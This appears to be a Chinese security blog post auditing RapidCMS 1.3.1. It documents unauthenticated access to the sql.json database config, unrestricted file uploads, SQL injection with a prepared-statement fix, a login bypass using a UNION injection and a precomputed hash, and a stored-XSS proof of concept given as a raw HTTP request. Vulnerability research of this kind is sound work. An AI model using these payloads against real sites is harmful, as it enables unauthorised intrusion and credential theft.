#  RapidCMS 1.3.1代码审计 （超多漏洞点）   
原创 LULU  红队蓝军   2024-11-01 18:05  
  
影响版本：RapdiCMS(1.3.1版本)  
  
下载地址：https://github.com/OpenRapid/rapidcms  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7u3H5soucic1rc3uPkYB9nN8xyABib9Chml0KKwjxTDEZetD0s6gGyCb1NVyiashAiaYb1kG6fp3wztw/640?wx_fmt=png&from=appmsg "")  
## 未授权  
  
**登录存在未授权访问**  
  
1、使用burp抓包，查找登录接口代码文件  
  
使用post发起请求，通过runlogin.php文件传递了两个参数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7u3H5soucic1rc3uPkYB9nNFmB8uMA7Xiac4S16SCGF04AkhBviaHVB9QqL4q82pAicEAKyfKysZxMJw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7u3H5soucic1rc3uPkYB9nNS8iar6jUWNG6aYckHIY8HNS1c0Qz54oslKfSvbvzeOyNFGwPjzxaCGA/640?wx_fmt=png&from=appmsg "")  
  
查看runlogin.php  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7u3H5soucic1rc3uPkYB9nN98AVt4THoZt6ONoShmgXVyxaCQw8NWhzcy76aYaVYBaCMYuXibow9Bg/640?wx_fmt=png&from=appmsg "")  
  
这个时候直接通过GET读取sql.json文件  
  
访问：http://xxx.com/install/sql-config/sql.json  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7u3H5soucic1rc3uPkYB9nNDcwd53dfE0PxM02DKhvyp1ojOSE0uHicOuKuw6BWFkQBbXB5a3t3qoQ/640?wx_fmt=png&from=appmsg "")  
## 文件上传1  
  
进入后台后，基于功能点进行代码审计  
  
基本设置-图标 admin/uploadicon. php  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7u3H5soucic1rc3uPkYB9nN0R0YCp59NtyKPDvrKfqcV4yUicNeYicRc2sNptOIdLwW7P2tkkcDGQTA/640?wx_fmt=png&from=appmsg "")  
  
可以看到没有做过的校验和限制，这时候使用burp抓包之后，修改上传的后缀即可。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7u3H5soucic1rc3uPkYB9nNoia46y6wrVoND6ngyrKyXVUWK3mKJh6iabImbOia58Xx7GzibsbhYcqcIg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7u3H5soucic1rc3uPkYB9nNPymTdeeSmpO3yibW5du2rW5GuMoSw7La6AL0xY2iatuWhDGxZ0weIIsw/640?wx_fmt=png&from=appmsg "")  
## 文件上传2  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7u3H5soucic1rc3uPkYB9nNibhBqgjS6VfJtsAGSMZtibegSj51lrhkB46l5JrCUT4Dw1erHD5ezl8w/640?wx_fmt=png&from=appmsg "")  
  
新增文章admin/upload. php  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7u3H5soucic1rc3uPkYB9nNkcfYlKkLfjARbhWgFYdV7MqjJ18wEbmL0518L8BlpjiagPulIBq6lww/640?wx_fmt=png&from=appmsg "")  
  
和上述一样，使用burp抓包即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7u3H5soucic1rc3uPkYB9nNd9wEd7gMckqd4DU4aG4RzQKHiaugfbQpGKcem8IRCRgdDgaLw4s4kvQ/640?wx_fmt=png&from=appmsg "")  
## sql注入  
  
新增分类cate-add-run. php  
```

<?php
include("../check.php");

header ( "Content-type:text/html;charset=utf-8" );
$json_string = file_get_contents('../../install/sql-config/sql.json');
$dataxxx = json_decode($json_string, true);
$link=mysqli_connect($dataxxx['server'],$dataxxx['dbusername'],$dataxxx['dbpassword']);

if($link)
{
    $select=mysqli_select_db($link,$dataxxx['dbname']);
  if($select)
  {

      $str='INSERT INTO `rapidcmscategory`(`id`, `name`, `pic`, `num`) VALUES ("'.$_POST["id"].'","'.rawurlencode($_POST["name"]).'","'.$_POST["pic"].'",'.$_POST["num"].')';

   $result=mysqli_query($link,$str);
      sendalert("增加成功！");
  }
}
?>

```  
  
分析：从POST请求中获取参数（id、name、pic、num），并构建SQL插入语句，将数据插入到rapidcmscategory表中。  
  
这里没有对通过post传递的参数进行校验，就像rapidcmscategory总插入数据  
  
**获取数据库**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7u3H5soucic1rc3uPkYB9nNibMtzle4l6bh3NicRLcDETTq8Vot7aWL8qdx61LiapNXM1Q838oGQXL4Q/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7u3H5soucic1rc3uPkYB9nN34j3FRWhYCr5XukfCGXXfZ48Gic2TqOzQ9jGR1mRZZT9EmI5slfoJ5Q/640?wx_fmt=png&from=appmsg "")  
  
整个CMS中存在很多的SQL注入漏洞  
  
**SQL注入修复方式**  
```
$stmt = $link->prepare('INSERT INTO `rapidcmscategory`(`id`, `name`, `pic`, `num`) VALUES (?, ?, ?, ?)');
$stmt->bind_param('sssi', $_POST["id"], rawurlencode($_POST["name"]), $_POST["pic"], $_POST["num"]);
$stmt->execute();


```  
  
整个CMS中存在很多的SQL注入漏洞，比如。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7u3H5soucic1rc3uPkYB9nNu0U3xKI8Eylb4341Pt7VxuujH0oviaRfjtruURbJwMHPQAicBvuyjgeQ/640?wx_fmt=png&from=appmsg "")  
## 登录逻辑绕过  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v7u3H5soucic1rc3uPkYB9nNicwzdYtYJ9awr78Syayiaz2wFkp8JIoR1t89NPjFSu10fdYbez7krt8w/640?wx_fmt=png&from=appmsg "")  
  
只要满足  
password11匹配成功，登录成功，这里就可以利用SQL注入将password经过md5、sha1、md5加密后的值。进行绕过。  
  
**第一步：**  
  
将password=admin这个值进行md5、sha1、md5加密，加密后值为：83C72CE1CAB133635EF751487234A947  
  
**第二步：**  
  
使用sql方式进行注入，向数据库注入存储的密码$pa  
```
select password from `rapidcmsadmin` Where username = 'admin' union select '83C72CE1CAB133635EF751487234A947' -- a;

```  
  
**第三步：**  
  
使用burp抓包，password=admin，经过  
password)));后，与数据库中$pa相匹配。  
## XSS漏洞  
  
漏洞地址：/admin/article/article-add-run.php  
  
POC  
```
POST /admin/article/article-add-run.php HTTP/1.1
Host: demo.com
Content-Length: 115
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://demo.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://demo.com/admin/article/article-add.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: deviceid=1722062988348; xinhu_ca_rempass=0; t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MjY6InBocCB8IHBocD8gfCBwaHRtbCB8IHNodG1sIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3D; Hm_lvt_f6f37dc3416ca514857b78d0b158037e=1723172185; csrf_358693=2df7a84f; SECKEY_ABVK=OwAgykiuZ90JyymTDay7TVxsu9K7i77SDQ1wYucKShE%3D; BMAP_SECKEY=zsabggfKizJ7RMP-whUACbv-8Y8e5RtMYzyqN6tgzDDcqlIgvjPYXLThdapgeYvMI5gtvLD423X1mOjreODpLfh2LBSqd-MfWUOnirBpX6X5MhDcI2h78cg9SCeZlworW5OtN5Li7126gdR5a9n2B0G1H09Eu9K-e5yMSsxdwbkojLGWbNKpJSNGySLmO3bA; lang=zh-cn; vision=rnd; device=desktop; theme=default; hideMenu=false; preExecutionID=3; executionTaskOrder=status%2Cid_desc; Hm_lvt_5964cd4b8810fcc73c98618d475213f6=1723680035; http304ok=1; qebak_loginlangid=1; csrf_f2b6b4=adc34ccd; downloading=null; storyModuleParam=0; storyProductParam=0; storyBranchParam=0; executionStoryOrder=order_desc; storyPreExecutionID=3; docSpaceParam=%7B%22type%22%3A%22execution%22%2C%22objectID%22%3A%223%22%2C%22libID%22%3A%227%22%2C%22moduleID%22%3A%220%22%2C%22browseType%22%3A%22%22%2C%22param%22%3A%220%22%7D; lastDocModule=0; lastProject=2; docFilesViewType=list; tab=doc; xinhu_ca_adminuser=admin; xinhu_mo_adminid=eg0el0gx0ttm0tut0et0mx0ml0ea0el0tuj0tuj0ee0tua0ew0mg09; admin=Y4W4R2t0a9Wa46O0O0Oa
Connection: keep-alive

id=eMU9DDcw3b&title=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&categoryid=1&file=&content=%3Cp%3E%3Cbr%3E%3C%2Fp%3E

```  
## 参考文章：  
  
https://mp.weixin.qq.com/s/MDzVmu-HIRApIumuoetpjw  
  
https://xz.aliyun.com/t/14577#toc-10  
  
加下方wx，拉你一起进群学习  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibZ6uZjjH3v5KP8CaWoS7GAJnWQQxPpibNdibOdl0hc3X6uuBy7rLVOoxS0OSd4vdHWcibFpZg9T9Bx6T7Rn87RoIw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
